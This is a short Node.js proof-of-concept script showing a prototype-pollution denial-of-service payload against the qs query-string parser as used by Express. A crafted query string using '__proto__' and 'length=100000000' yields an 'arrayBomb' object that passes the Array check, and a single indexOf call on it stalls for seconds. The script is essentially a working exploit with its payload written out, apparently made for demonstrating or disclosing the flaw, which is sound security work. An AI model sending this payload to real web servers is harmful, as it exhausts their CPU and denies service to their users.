const qs = require("qs");
{
	
	// using the default express configuration :
	console.log('Using the default express configuration : \n');
	console.log('qs.parse("categories[__proto__]=login&categories[__proto__]&categories[length]=100000000", { allowPrototypes: true })');
	
	let query     = qs.parse("categories[__proto__]=login&categories[__proto__]&categories[length]=100000000", { allowPrototypes: true }),
	    arrayBomb = query.categories;
	
	console.log('arrayBomb value : ', arrayBomb);
	/*
	 arrayBomb === Array { length: '100000000' }
	 
	 internal structure :
	 {
	 length    : '100000000',
	 __proto__ : ['login', '']
	 }
	 */
	
	console.log('(arrayBomb instanceof Array) : ', (arrayBomb instanceof Array)); // true
	console.log("Do arrayBomb.indexOf(\"123\")...");
	console.time("Do arrayBomb.indexOf(\"123\") duration ");
	arrayBomb.indexOf("123")// this will take ~5s
	console.timeEnd("Do arrayBomb.indexOf(\"123\") duration ");
	console.log("\n\n_________________________\n\n");
}
